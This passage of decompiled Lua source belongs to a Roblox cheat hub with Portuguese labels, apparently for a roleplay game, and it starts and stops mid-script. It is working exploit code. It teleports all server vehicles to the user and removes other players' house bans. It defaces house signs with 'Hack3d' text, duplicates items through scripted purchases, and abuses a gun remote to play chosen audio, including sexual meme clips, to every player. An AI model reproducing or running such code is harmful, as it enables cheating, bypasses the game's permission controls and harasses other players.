    if t1.value69.LocalPlayer.Character and t1.value69.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local HumanoidRootPartPosition = t1.value69.LocalPlayer.Character.HumanoidRootPart.Position

        t1.value69:ToggleFallDamage(true)

        if t1.value69:TeleportToSeat(VehicleSeat, _GSelectedVehicle) then
            t1.value69:TeleportToPlayer(_GSelectedVehicle, HumanoidRootPartPosition)
            t1.value69:MostrarNotificacao("Carro " .. _G.SelectedVehicle .. " foi teleportado para você!")
            t1.value69:ExitCarAndReturn(HumanoidRootPartPosition)
        else
            t1.value69:MostrarNotificacao("Falha ao sentar no carro!")
        end

        t1.value69:ToggleFallDamage(false)

        return
    end

    t1.value69:MostrarNotificacao("Personagem do jogador não encontrado!")
end
})
v34:AddButton({
    Name = "Trazer Todos os Carros",
    Description = "Teleporta todos os carros do servidor para sua posição",
    Callback = function()
    if t1.value69.LocalPlayer.Character and t1.value69.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
        local HumanoidRootPartPosition = t1.value69.LocalPlayer.Character.HumanoidRootPart.Position
        local Vehicles = t1.value69.Workspace:FindFirstChild("Vehicles")
        if not Vehicles then
            t1.value69:MostrarNotificacao("Pasta de veículos não encontrada!")

            return
        end
        local value69 = t1.value69
        local GetChildren = Vehicles.GetChildren
        value69:ToggleFallDamage(true)
        local t46 = {}
        for v715, v716 in ipairs(GetChildren(Vehicles)) do

            if v716.Name:match("Car$") then
                table.insert(t46, v716)
            end
        end
        for _, v in ipairs(t46) do
            local VehicleSeat = v:FindFirstChildWhichIsA("VehicleSeat", true)

            if VehicleSeat and VehicleSeat.Occupant == nil then
                if t1.value69:TeleportToSeat(VehicleSeat, v) then
                    t1.value69:TeleportToPlayer(v, HumanoidRootPartPosition)
                    t1.value69:ExitCarAndReturn(HumanoidRootPartPosition)
                    t1.value69:MostrarNotificacao("Carro " .. v.Name .. " foi teleportado para você!")
                    task.wait(1)
                else
                    t1.value69:MostrarNotificacao("Falha ao sentar no carro " .. v.Name .. "!")
                end
            elseif VehicleSeat then
                t1.value69:MostrarNotificacao("Carro " .. v.Name .. " ignorado: alguém está no assento do motorista!")
            else
                t1.value69:MostrarNotificacao("Carro " .. v.Name .. " ignorado: assento não encontrado!")
            end
        end
        t1.value69:ToggleFallDamage(false)
        if #t46 == 0 then
            t1.value69:MostrarNotificacao("Nenhum carro disponível para teleportar!")
        end

        return
    end

    t1.value69:MostrarNotificacao("Personagem do jogador não encontrado!")
end
})
t1.value71 = false
t1.value69.LocalPlayer.CharacterAdded:Connect(function(character)
    local Humanoid = character:WaitForChild("Humanoid")

    if t1.value71 then
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, false)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, false)
        Humanoid:SetStateEnabled(Enum.HumanoidStateType.GettingUp, true)
        Humanoid.PlatformStand = false

        return
    end

    Humanoid:SetStateEnabled(Enum.HumanoidStateType.FallingDown, true)
    Humanoid:SetStateEnabled(Enum.HumanoidStateType.Ragdoll, true)
end)
v34:AddSection({ "Vehicle - Rgb" })

local function v41()
    local Players8 = game:GetService("Players")
    local RunService = game:GetService("RunService")
    local SetColor = Players8.LocalPlayer:WaitForChild("PlayerGui"):WaitForChild("MainGUIHandler"):WaitForChild("VehicleControl"):WaitForChild("UIColorPicker"):WaitForChild("SetColor")

    return RunService.RenderStepped:Connect(function()
        local color3_7 = Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))

        SetColor:FireServer(color3_7)
    end)
end
t1.value72 = nil
v34:AddToggle({
    Name = "Vehicle - Rgb (by: dreamy)",
    Default = false,
    Callback = function(p70)
    if p70 then
        if not t1.value72 then
            t1.value72 = v41()
        end

        print("RGB CAR ativado")

        return
    end

    if t1.value72 then
        t1.value72:Disconnect()
    end

    print("RGB CAR desativado")
end
})
v34:AddSection({ "Loop Scripts" })

local Remotes = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")

t1.value73 = Remotes:WaitForChild("PlayHorn")
t1.value74 = Remotes:WaitForChild("StopHorn")
v34:AddToggle({
    Name = "Loop Play Horn (by: dreamy)",
    Default = false,
    Callback = function(p71)
    if p71 then
        t1.value73:InvokeServer()

        return
    end

    t1.value74:InvokeServer()
end
})
local v43 = t1.value19:MakeTab({
    "House",
    "home"
})
v43:AddSection({ "Your House" })
t1.value75 = game:GetService("RunService")
t1.value76 = false
t1.value77 = nil
v43:AddToggle({
    Name = "House - Rgb",
    Default = false,
    Callback = function(p72)
    t1.value76 = p72

    if t1.value76 then
        t1.value77 = t1.value75.RenderStepped:Connect(function()
            local t47 = {
                    "ColorPickHouse",
                    (Color3.fromHSV(math.random(), 1, 1))
                }
            local v1268 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e")
            local t48 = { unpack(t47) }

            v1268:FireServer(v2(t48))
        end)

        return
    end

    if t1.value77 then
        t1.value77:Disconnect()
    end
end
})
t1.value78 = game:GetService("RunService")
t1.value79 = false
t1.value80 = nil
v43:AddToggle({
    Name = "Housetext - Rgb",
    Default = false,
    Callback = function(p73)
    t1.value79 = p73

    if t1.value79 then
        t1.value80 = t1.value78.RenderStepped:Connect(function()
            local t49 = {
                    "PickingBusinessNameColor",
                    (Color3.fromHSV(math.random(), 1, 1))
                }
            local v1271 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPHous1eEven1tColo1r")
            local t50 = { unpack(t49) }

            v1271:FireServer(v2(t50))
        end)

        return
    end

    if t1.value80 then
        t1.value80:Disconnect()
    end
end
})
v43:AddSection({ "Hack3d Housetext" })
t1.value81 = game:GetService("RunService")
t1.value82 = false
t1.value83 = nil
t1.value84 = 0
t1.value85 = false
t1.value86 = {
    "Pulsar Hub",
    "Pulsar Hub On Top",
    "Pulsar Hub",
    "Pulsar Hub as here",
    "hi Dazzy",
    "Boom!!!"
}
v43:AddToggle({
    Name = "Apply Hack3d Housetext",
    Default = false,
    Callback = function(p74)
    t1.value82 = p74

    if t1.value82 then
        t1.value83 = t1.value81.RenderStepped:Connect(function()
            if tick() - t1.value84 < 0.35 then
                return
            end

            tick()
            t1.value85 = not t1.value85

            local v1273 = t1.value85 and Color3.new(0, 0, 0) or Color3.new(0, 1, 0)
            local v1274 = t1.value86[math.random(1, #t1.value86)]

            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPHous1eEven1t"):FireServer("BusinessName", v1274)
            game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1RPHous1eEven1tColo1r"):FireServer("PickingBusinessNameColor", v1273)
        end)

        return
    end

    if t1.value83 then
        t1.value83:Disconnect()
    end
end
})
v43:AddSection({ "Other Houses" })
v43:AddButton({
    Name = "Remover Ban de Todas as Casas",
    Description = "Tenta remover o ban de todas as casas ",
    Callback = function()
    local n11 = 0
    local n12 = 0
    for i = 1, 37 do
        local v733 = "BannedBlock" .. i
        local v734 = t1.value68:FindFirstChild(v733, true)

        if v734 then
            local ok, _ = pcall(function()
                v734:Destroy()
            end)

            if ok then
                n11 = n11 + 1
            else
                n12 = n12 + 1
            end
        end
    end
    for v739, v740 in pairs(t1.value68:GetDescendants()) do

        local v741 = v740

        if v741.Name:match("BannedBlock") then
            local ok, _ = pcall(function()
                v741:Destroy()
            end)

            if ok then
                n11 = n11 + 1
            else
                n12 = n12 + 1
            end
        end
    end
    if n11 > 0 then
        local StarterGui = game.StarterGui
        local v745 = "Bans removidos de " .. n11 .. " casas!"

        StarterGui:SetCore("SendNotification", {
                Title = "Sucesso",
                Text = v745,
                Duration = 5
            })
    end
    if n12 > 0 then
        local StarterGui = game.StarterGui
        local v747 = "Falha ao remover bans de " .. n12 .. " casas."

        StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = v747,
                Duration = 5
            })
    end
    if n11 == 0 and n12 == 0 then
        game.StarterGui:SetCore("SendNotification", {
                Title = "Aviso",
                Text = "Nenhum ban encontrado para remover.",
                Duration = 5
            })
    end
end
})
v43:AddSection({ "Props" })
t1.value87 = game.Players.LocalPlayer
v43:AddToggle({
    Name = "Disable Prop Spawn",
    Default = false,
    Callback = function(p75)
    local t51 = { p75 }
    local ok, result2 = pcall(function()
        local v1275 = workspace:WaitForChild("001_Lots"):WaitForChild(t1.value87.Name .. "House"):WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):WaitForChild("Permissions:SetPropPlacementBlockedForOthers")
        local t52 = { unpack(t51) }

        v1275:InvokeServer(v2(t52))
    end)
    if not ok then
        warn("Não foi possível alterar o bloqueio de props:", result2)
    end
end
})
t1.value88 = game.Players.LocalPlayer
v43:AddButton({
    Name = "Delete All Props",
    Callback = function()
    local ok, result3 = pcall(function()
        workspace:WaitForChild("001_Lots"):WaitForChild(t1.value88.Name .. "House"):WaitForChild("HousePickedByPlayer"):WaitForChild("HouseModel"):WaitForChild("Permissions:ClearProps"):InvokeServer()
    end)

    if not ok then
        warn("Não foi possível limpar os props:", result3)
    end
end
})
v43:AddSection({ "Loop Scripts" })
t1.value89 = false
v43:AddToggle({
    Name = "Loop Garage",
    Default = false,
    Callback = function(p76)
    t1.value89 = p76

    if t1.value89 then
        task.spawn(function()
            while t1.value89 do
                local v1277 = game:GetService("ReplicatedStorage"):WaitForChild("RE"):WaitForChild("1Player1sHous1e")
                local t53 = { unpack({ "GarageDoor" }) }

                v1277:FireServer(v2(t53))
                task.wait(7)
            end
        end)
    end
end
})
local v44 = t1.value19:MakeTab({
    "Fun Players",
    "fun"
})
v44:AddSection({ "Fun Players" })

local Players9 = game:GetService("Players")

t1.value90 = game:GetService("ReplicatedStorage")
t1.value91 = Players9.LocalPlayer
t1.value92 = {
    Vector3.new(0, 0, 0),
    Vector3.new(10, 0, 0),
    Vector3.new(20, 0, 0),
    Vector3.new(30, 0, 0),
    Vector3.new(40, 0, 0),
    Vector3.new(50, 0, 0),
    Vector3.new(60, 0, 0),
    Vector3.new(0, 0, 0),
    Vector3.new(-10, 0, 0),
    Vector3.new(-20, 0, 0),
    Vector3.new(-30, 0, 0),
    Vector3.new(-40, 0, 0),
    Vector3.new(-50, 0, 0),
    Vector3.new(-60, 0, 0),
    Vector3.new(0, 0, 30),
    Vector3.new(10, 0, 30),
    Vector3.new(20, 0, 30),
    Vector3.new(30, 0, 30),
    Vector3.new(40, 0, 30),
    Vector3.new(50, 0, 30),
    Vector3.new(60, 0, 30),
    Vector3.new(0, 0, 30),
    Vector3.new(-10, 0, 30),
    Vector3.new(-20, 0, 30),
    Vector3.new(-30, 0, 30),
    Vector3.new(-40, 0, 30),
    Vector3.new(-50, 0, 30),
    Vector3.new(-60, 0, 30),
    Vector3.new(0, 0, 45),
    Vector3.new(10, 0, 45),
    Vector3.new(20, 0, 45),
    Vector3.new(30, 0, 45),
    Vector3.new(40, 0, 45),
    Vector3.new(50, 0, 45),
    Vector3.new(60, 0, 45),
    Vector3.new(0, 0, 45),
    Vector3.new(-10, 0, 45),
    Vector3.new(-20, 0, 45),
    Vector3.new(-30, 0, 45),
    Vector3.new(-40, 0, 45),
    Vector3.new(-50, 0, 45),
    Vector3.new(-60, 0, 45),
    Vector3.new(0, 0, 15),
    Vector3.new(10, 0, 15),
    Vector3.new(20, 0, 15),
    Vector3.new(30, 0, 15),
    Vector3.new(40, 0, 15),
    Vector3.new(50, 0, 15),
    Vector3.new(60, 0, 15),
    Vector3.new(0, 0, 15),
    Vector3.new(-10, 0, 15),
    Vector3.new(-20, 0, 15),
    Vector3.new(-30, 0, 15),
    Vector3.new(-40, 0, 15),
    Vector3.new(-50, 0, 15),
    Vector3.new(-60, 0, 15),
    Vector3.new(0, 0, -15),
    Vector3.new(10, 0, -15),
    Vector3.new(20, 0, -15),
    Vector3.new(30, 0, -15),
    Vector3.new(40, 0, -15),
    Vector3.new(50, 0, -15),
    Vector3.new(60, 0, -15),
    Vector3.new(0, 0, -15),
    Vector3.new(-10, 0, -15),
    Vector3.new(-20, 0, -15),
    Vector3.new(-30, 0, -15),
    Vector3.new(-40, 0, -15),
    Vector3.new(-50, 0, -15),
    Vector3.new(-60, 0, -15),
    Vector3.new(0, 0, -30),
    Vector3.new(10, 0, -30),
    Vector3.new(20, 0, -30),
    Vector3.new(30, 0, -30),
    Vector3.new(40, 0, -30),
    Vector3.new(50, 0, -30),
    Vector3.new(60, 0, -30),
    Vector3.new(0, 0, -30),
    Vector3.new(-10, 0, -30),
    Vector3.new(-20, 0, -30),
    Vector3.new(-30, 0, -30),
    Vector3.new(-40, 0, -30),
    Vector3.new(-50, 0, -30),
    Vector3.new(-60, 0, -30),
    Vector3.new(0, 0, -30),
    Vector3.new(10, 0, -45),
    Vector3.new(20, 0, -45),
    Vector3.new(30, 0, -45),
    Vector3.new(40, 0, -45),
    Vector3.new(50, 0, -45),
    Vector3.new(60, 0, -45),
    Vector3.new(0, 0, -45),
    Vector3.new(-10, 0, -45),
    Vector3.new(-20, 0, -45),
    Vector3.new(-30, 0, -45),
    Vector3.new(-40, 0, -45),
    Vector3.new(-50, 0, -45),
    Vector3.new(-60, 0, -45),
    Vector3.new(10, 0, -60),
    Vector3.new(20, 0, -60),
    Vector3.new(30, 0, -60),
    Vector3.new(40, 0, -60),
    Vector3.new(50, 0, -60),
    Vector3.new(60, 0, -60),
    Vector3.new(0, 0, -60),
    Vector3.new(-10, 0, -60),
    Vector3.new(-20, 0, -60),
    Vector3.new(-30, 0, -60),
    Vector3.new(-40, 0, -60),
    Vector3.new(-50, 0, -60),
    Vector3.new(-60, 0, -60),
    Vector3.new(10, 0, -75),
    Vector3.new(20, 0, -75),
    Vector3.new(30, 0, -75),
    Vector3.new(40, 0, -75),
    Vector3.new(50, 0, -75),
    Vector3.new(60, 0, -75),
    Vector3.new(0, 0, -75),
    Vector3.new(-10, 0, -75),
    Vector3.new(-20, 0, -75),
    Vector3.new(-30, 0, -75),
    Vector3.new(-40, 0, -75),
    Vector3.new(-50, 0, -75),
    Vector3.new(-60, 0, -75)
}
v44:AddButton({
    Name = "Dupe WaterkngCan (by Bruton)",
    Description = "This takes time and can lag your phone, be careful.",
    Callback = function()
    local v755 = t1.value91.Character or t1.value91.CharacterAdded:Wait()
    local HumanoidRootPart = v755:WaitForChild("HumanoidRootPart")
    local Humanoid = v755:WaitForChild("Humanoid")
    local HumanoidRootPartCFrame = HumanoidRootPart.CFrame
    local v759 = workspace:FindFirstChild("001_Lots")
    t1.value90:WaitForChild("RE"):WaitForChild("1Clea1rTool1s"):FireServer("ClearAllTools")
    task.wait(0.3)
    local GetChildren = v759.GetChildren
    local t54 = {}
    for v764, v765 in pairs(GetChildren(v759)) do

        if v765.Name == "For Sale" then
            local GetDescendants = v765.GetDescendants

            for _, v in pairs(GetDescendants(v765)) do
                if v:IsA("NumberValue") and (v.Name == "Number" and (v.Value > 10 and v.Value < 25)) then
                    local insert = table.insert
                    local vValue = v.Value

                    insert(t54, {
                            Lot = v765,
                            Number = vValue
                        })

                    break
                end
            end
        end
    end
    if #t54 > 0 then
        local v771 = t54[math.random(1, #t54)]
        local Lot = v771.Lot
        local Number = v771.Number
        local BuyHouse = Lot:FindFirstChild("BuyHouse")
        if BuyHouse then
            HumanoidRootPart.CFrame = BuyHouse.CFrame + Vector3.new(0, 3, 0)
            task.wait(0.5)

            if BuyHouse:FindFirstChild("ClickDetector") then
                fireclickdetector(BuyHouse.ClickDetector)
            end
        end
        task.wait(0.6)
        t1.value90:WaitForChild("Remotes"):WaitForChild("TelemetryClientInteraction"):FireServer("filterClick", {
                name = "058_House",
                itemType = "Houses"
            })
        task.wait(0.8)
        t1.value90:WaitForChild("Remotes"):WaitForChild("Lot:BuildProperty"):InvokeServer(Number, "058_House")
        task.wait(5)
        local v775 = v759:FindFirstChild(t1.value91.Name .. "House")
        if v775 then
            pcall(function()
                local WateringCan = v775.HousePickedByPlayer.HouseModel["001_Fridge"].FoodTools.WateringCan

                HumanoidRootPart.CFrame = WateringCan.CFrame + Vector3.new(0, 3, 0)

                local WalkSpeed = Humanoid.WalkSpeed

                Humanoid.WalkSpeed = 0

                local ClickDetector = WateringCan:FindFirstChild("ClickDetector")

                if ClickDetector then
                    while true do
                        local n13 = 0

                        for _, child in ipairs(t1.value91.Backpack:GetChildren()) do
                            if child.Name == "WateringCan" then
                                n13 = n13 + 1
                            end
                        end

                        if v755:FindFirstChild("WateringCan") then
                            n13 = n13 + 1
                        end

                        if n13 >= 120 then
                            break
                        end

                        fireclickdetector(ClickDetector)
                        task.wait(0.01)
                    end
                end

                Humanoid.WalkSpeed = WalkSpeed
            end)
        end
        task.wait(0.5)
        HumanoidRootPart.CFrame = HumanoidRootPartCFrame
        task.wait(0.5)
        local t55 = {}
        for v779, v780 in ipairs(t1.value91.Backpack:GetChildren()) do

            if v780.Name == "WateringCan" then
                table.insert(t55, v780)
            end
        end
        for i = 1, #t55 do
            local v782 = i
            local v783 = t55[v782]

            if v783 and t1.value92[v782] then
                v783.GripPos = t1.value92[v782]
                v783.Parent = v755

                if v782 % 15 == 0 then
                    task.wait()
                end
            end
        end
    end
end
})
v44:AddSection({
    Name = "Head Sit"
})
t1.value93 = nil
t1.value94 = nil
t1.value95 = game.Players.LocalPlayer
t1.value96 = {}
function t1.value97()
    t1.value96 = {}

    for _, player in pairs(game.Players:GetPlayers()) do
        table.insert(t1.value96, player.Name)
    end

    return t1.value96
end
t1.value97()
local AddDropdown2 = v44.AddDropdown
local value96 = t1.value96
t1.value98 = AddDropdown2(v44, {
    Name = "Select a Player",
    Default = "",
    Options = value96,
    Callback = function(p77)
    t1.value93 = p77
end
})
v44:AddToggle({
    Name = "Head Sit",
    Default = false,
    Callback = function(p78)
    local LocalPlayer13 = game.Players.LocalPlayer
    local v789 = LocalPlayer13.Character or LocalPlayer13.CharacterAdded:Wait()
    local HumanoidRootPart = v789:WaitForChild("HumanoidRootPart")
    local Humanoid = v789:WaitForChild("Humanoid")

    if not t1.value93 or t1.value93 == "" then
        return false
    end

    local t1value93 = game.Players:FindFirstChild(t1.value93)

    if p78 then
        if t1value93 and t1value93.Character then
            Humanoid.Sit = true

            if t1.value94 then
                t1.value94:Disconnect()
            end

            t1.value94 = game:GetService("RunService").Heartbeat:Connect(function()
                if t1value93.Character and (t1value93.Character:FindFirstChild("Head") and Humanoid.Sit) then
                    HumanoidRootPart.CFrame = t1value93.Character.Head.CFrame * CFrame.Angles(0, 0, 0) * CFrame.new(0, 1.6, 0.4)

                    return
                end

                if t1.value94 then
                    t1.value94:Disconnect()
                    t1.value94 = nil
                    Humanoid.Sit = false
                end
            end)

            return
        end

        return false
    end

    if t1.value94 then
        t1.value94:Disconnect()
    end

    Humanoid.Sit = false
end
})
v44:AddButton({
    Name = "Update Player List",
    Callback = function()
    local v793 = t1.value97()

    if t1.value98 and v793 then
        pcall(function()
            t1.value98:Refresh(v793)
        end)

        local value93 = t1.value93

        if value93 then
            value93 = not game.Players:FindFirstChild(t1.value93)
        end

        if value93 then
            pcall(function()
                t1.value98:Set("")
            end)
        end
    end
end
})
local v48 = t1.value19:MakeTab({
    "Avatar",
    "rbxassetid://10734952036"
})
v48:AddSection({
    Name = "Avatar"
})
v48:AddSection({
    Name = "Copy Avatar"
})
t1.value99 = game:GetService("Players")
t1.value100 = game:GetService("ReplicatedStorage"):WaitForChild("Remotes")
t1.value101 = nil
function t1.value102()
    local t56 = {}

    for _, player in ipairs(t1.value99:GetPlayers()) do
        table.insert(t56, player.Name)
    end

    return t56
end
local v49 = t1.value102()
local value101 = t1.value101
t1.value103 = v48:AddDropdown({
    Name = "Select Player",
    Options = v49,
    Default = value101,
    Callback = function(p79)
    t1.value101 = p79
end
})
local function v51()
    t1.value103:Refresh(t1.value102(), true)
end
t1.value99.PlayerAdded:Connect(v51)
t1.value99.PlayerRemoving:Connect(v51)
v48:AddButton({
    Name = "Copy Avatar",
    Callback = function()
    if not t1.value101 then
        return
    end

    local Character = t1.value99.LocalPlayer.Character
    local t1value101 = t1.value99:FindFirstChild(t1.value101)

    if t1value101 and t1value101.Character then
        local v801 = Character and Character:FindFirstChildOfClass("Humanoid")
        local Humanoid = t1value101.Character:FindFirstChildOfClass("Humanoid")

        if v801 and Humanoid then
            local AppliedDescription = v801:GetAppliedDescription()
            local GetAccessories = AppliedDescription.GetAccessories
            for v807, v808 in ipairs(GetAccessories(AppliedDescription, true)) do

                if v808.AssetId and tonumber(v808.AssetId) then
                    local Wear = t1.value100.Wear
                    local t57 = { tonumber(v808.AssetId) }

                    Wear:InvokeServer(v2(t57))
                    task.wait(0.2)
                end
            end
            if tonumber(AppliedDescription.Shirt) then
                t1.value100.Wear:InvokeServer((tonumber(AppliedDescription.Shirt)))
                task.wait(0.2)
            end
            if tonumber(AppliedDescription.Pants) then
                local Wear = t1.value100.Wear
                local t58 = { tonumber(AppliedDescription.Pants) }

                Wear:InvokeServer(v2(t58))
                task.wait(0.2)
            end
            if tonumber(AppliedDescription.Face) then
                t1.value100.Wear:InvokeServer(tonumber(AppliedDescription.Face))
                task.wait(0.2)
            end
            local AppliedDescription2 = Humanoid:GetAppliedDescription()
            local Torso = AppliedDescription2.Torso
            local RightArm = AppliedDescription2.RightArm
            local LeftArm = AppliedDescription2.LeftArm
            local RightLeg = AppliedDescription2.RightLeg
            local LeftLeg = AppliedDescription2.LeftLeg
            local Head = AppliedDescription2.Head
            local t59 = {
                    [1] = {
                        [1] = Torso,
                        [2] = RightArm,
                        [3] = LeftArm,
                        [4] = RightLeg,
                        [5] = LeftLeg,
                        [6] = Head
                    }
                }
            t1.value100.ChangeCharacterBody:InvokeServer(unpack(t59))
            task.wait(0.5)
            if tonumber(AppliedDescription2.Shirt) then
                t1.value100.Wear:InvokeServer(tonumber(AppliedDescription2.Shirt))
                task.wait(0.3)
            end
            if tonumber(AppliedDescription2.Pants) then
                t1.value100.Wear:InvokeServer(tonumber(AppliedDescription2.Pants))
                task.wait(0.3)
            end
            if tonumber(AppliedDescription2.Face) then
                t1.value100.Wear:InvokeServer(tonumber(AppliedDescription2.Face))
                task.wait(0.3)
            end
            local GetAccessories2 = AppliedDescription2.GetAccessories
            for v824, v825 in ipairs(GetAccessories2(AppliedDescription2, true)) do

                if v825.AssetId and tonumber(v825.AssetId) then
                    local Wear = t1.value100.Wear
                    local t60 = { tonumber(v825.AssetId) }

                    Wear:InvokeServer(v2(t60))
                    task.wait(0.3)
                end
            end
            local v828 = t1value101.Character:FindFirstChild("Body Colors")
            if v828 then
                t1.value100.ChangeBodyColor:FireServer(tostring(v828.HeadColor))
                task.wait(0.3)
            end
            if tonumber(AppliedDescription2.IdleAnimation) then
                local Wear = t1.value100.Wear
                local t61 = { tonumber(AppliedDescription2.IdleAnimation) }

                Wear:InvokeServer(v2(t61))
                task.wait(0.3)
            end
            local PlayersBag = t1value101:FindFirstChild("PlayersBag")
            if PlayersBag then
                if PlayersBag:FindFirstChild("RPName") and PlayersBag.RPName.Value ~= "" then
                    t1.value100.RPNameText:FireServer("RolePlayName", PlayersBag.RPName.Value)
                    task.wait(0.3)
                end

                if PlayersBag:FindFirstChild("RPBio") and PlayersBag.RPBio.Value ~= "" then
                    t1.value100.RPNameText:FireServer("RolePlayBio", PlayersBag.RPBio.Value)
                    task.wait(0.3)
                end

                if PlayersBag:FindFirstChild("RPNameColor") then
                    t1.value100.RPNameColor:FireServer("PickingRPNameColor", PlayersBag.RPNameColor.Value)
                    task.wait(0.3)
                end

                if PlayersBag:FindFirstChild("RPBioColor") then
                    t1.value100.RPNameColor:FireServer("PickingRPBioColor", PlayersBag.RPBioColor.Value)
                    task.wait(0.3)
                end
            end
        end
    end
end
})
v48:AddSection({ "Character" })
t1.value104 = {
    "Bright red",
    "Lime green",
    "Bright blue",
    "Bright yellow",
    "Bright cyan",
    "Hot pink",
    "Royal purple"
}
t1.value105 = false
t1.value106 = nil
function t1.value106(p80)
    local ChangeBodyColor = game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("ChangeBodyColor")
    local t62 = { unpack({ p80 }) }

    ChangeBodyColor:FireServer(v2(t62))
end
function t1.value107(p81)
    t1.value105 = p81

    if t1.value105 then
        while t1.value105 do
            for _, v in ipairs(t1.value104) do
                if not t1.value105 then
                    return
                end

                t1.value106(v)
                wait(0.5)
            end
        end
    end
end
v48:AddToggle({
    Name = "RGB Character",
    Description = "Make your character RGB",
    Default = false,
    Callback = function(p82)
    t1.value107(p82)
end
})
local v52 = t1.value19:MakeTab({
    "Sound All",
    "box"
})
t1.value108 = game:GetService("Players")
t1.value109 = game:GetService("ReplicatedStorage")
t1.value110 = game:GetService("Workspace")

local function v53(p83)
    for _, player in ipairs(t1.value108:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local HumanoidRootPart = player.Character.HumanoidRootPart
            local vector3 = Vector3.new(0, -1, 0)
            local vector3_3 = Vector3.new(0, 0, 0)
            local _tostring = tostring
            local t63 = {
                [1] = true
            }
            local v847 = _tostring(p83)
            local str = tostring(p83)
            local vector3_4 = Vector3.new(0.25, 0.25, 100)
            local brickColor = BrickColor.new(24)
            local SmoothPlastic = Enum.Material.SmoothPlastic
            local t64 = {
                [1] = HumanoidRootPart,
                [2] = HumanoidRootPart,
                [3] = vector3,
                [4] = vector3_3,
                [5] = HumanoidRootPart,
                [6] = HumanoidRootPart,
                [7] = v847,
                [8] = str,
                [9] = t63,
                [10] = {
                    [1] = 25,
                    [2] = vector3_4,
                    [3] = brickColor,
                    [4] = 0.25,
                    [5] = SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }
            local RE = t1.value109:FindFirstChild("RE")

            if RE and RE:FindFirstChild("1Gu1n") then
                pcall(function()
                    RE["1Gu1n"]:FireServer(unpack(t64))
                end)
            end
        end
    end
end
t1.value111 = false
t1.value112 = ""
v52:AddTextBox({
    Name = "Insira o ID Audio All",
    Description = "Digite o ID do som que deseja tocar globalmente",
    PlaceholderText = "Exemplo: 1234567890",
    ClearTextOnFocus = true,
    Callback = function(p84)
    t1.value112 = tonumber(p84)
end
})
v52:AddButton({
    Name = "Tocar Som Global by Ghost",
    Description = "Toca o áudio para todos os jogadores",
    Callback = function()
    if t1.value112 then
        v53(t1.value112)

        local Sound = Instance.new("Sound")

        Sound.Parent = t1.value110
        Sound.SoundId = "rbxassetid://" .. t1.value112
        Sound.Volume = 3
        Sound.Looped = false
        Sound:Play()
        task.delay(5, function()
            Sound:Destroy()
        end)
    end
end
})
v52:AddToggle({
    Name = "Loop Global",
    Description = "Repetir som globalmente",
    Default = false,
    Callback = function(p85)
    t1.value111 = p85

    if t1.value111 then
        task.spawn(function()
            while t1.value111 do
                if t1.value112 then
                    v53(t1.value112)

                    local Sound = Instance.new("Sound")

                    Sound.Parent = t1.value110
                    Sound.SoundId = "rbxassetid://" .. t1.value112
                    Sound.Volume = 3
                    Sound.Looped = false
                    Sound:Play()
                    task.delay(5, function()
                        Sound:Destroy()
                    end)
                end

                task.wait(3)
            end
        end)
    end
end
})
v52:AddSection({ "memes-" })
t1.value113 = game:GetService("Players")
t1.value114 = game:GetService("ReplicatedStorage")
t1.value115 = game:GetService("Workspace")

local function v54(p86)
    for _, player in ipairs(t1.value113:GetPlayers()) do
        if player.Character and player.Character:FindFirstChild("HumanoidRootPart") then
            local HumanoidRootPart = player.Character.HumanoidRootPart
            local new = Vector3.new
            local t65 = {
                [1] = true
            }
            local v863 = new(0, -1, 0)
            local vector3 = Vector3.new(0, 0, 0)
            local str = tostring(p86)
            local str2 = tostring(p86)
            local vector3_5 = Vector3.new(0.25, 0.25, 100)
            local brickColor = BrickColor.new(24)
            local SmoothPlastic = Enum.Material.SmoothPlastic
            local t66 = {
                [1] = HumanoidRootPart,
                [2] = HumanoidRootPart,
                [3] = v863,
                [4] = vector3,
                [5] = HumanoidRootPart,
                [6] = HumanoidRootPart,
                [7] = str,
                [8] = str2,
                [9] = t65,
                [10] = {
                    [1] = 25,
                    [2] = vector3_5,
                    [3] = brickColor,
                    [4] = 0.25,
                    [5] = SmoothPlastic,
                    [6] = 0.25
                },
                [11] = true,
                [12] = false
            }
            local RE = t1.value114:FindFirstChild("RE")

            if RE and RE:FindFirstChild("1Gu1n") then
                pcall(function()
                    RE["1Gu1n"]:FireServer(unpack(t66))
                end)
            end
        end
    end
end
local t67 = {
    name = "Trollface laugh",
    id = "73753120048787"
}
local t68 = {
    name = "troll face sussy",
    id = "9098738774"
}
local t69 = {
    name = "troll cut",
    id = "8389041427"
}
local t70 = {
    name = "troll transition",
    id = "7705506391"
}
local t71 = {
    name = "troll laugh",
    id = "7816195044"
}
local t72 = {
    name = "Magic2",
    id = "9066733515"
}
local t73 = {
    name = "homero brasileo",
    id = "115224076671067"
}
local t74 = {
    name = "LOUD Youve been trolled",
    id = "6787686247"
}
local t75 = {
    name = "Fart Meme Sound",
    id = "6454805792"
}
local t76 = {
    name = "Metal Rattle 2 SFX",
    id = "9116788555"
}
local t77 = {
    name = "Hentai wiaaaaan",
    id = "88332347208779"
}
local t78 = {
    name = "iamete cunasai",
    id = "108494476595033"
}
local t79 = {
    name = "dodichan onnn...",
    id = "134640594695384"
}
local t80 = {
    name = "Toma jack",
    id = "132603645477541"
}
local t81 = {
    name = "Toma jackV2",
    id = "100446887985203"
}
local t82 = {
    name = "Toma jack no sol quente",
    id = "97476487963273"
}
local t83 = {
    name = "ifood",
    id = "133843750864059"
}
local t84 = {
    name = "pelo geito ela ta querendo ram",
    id = "94395705857835"
}
local t85 = {
    name = "lula vai todo mundo",
    id = "136804576009416"
}
local t86 = {
    name = "coringa",
    id = "84663543883498"
}
local t87 = {
    name = "shoope",
    id = "8747441609"
}
local t88 = {
    name = "quenojo",
    id = "103440368630269"
}
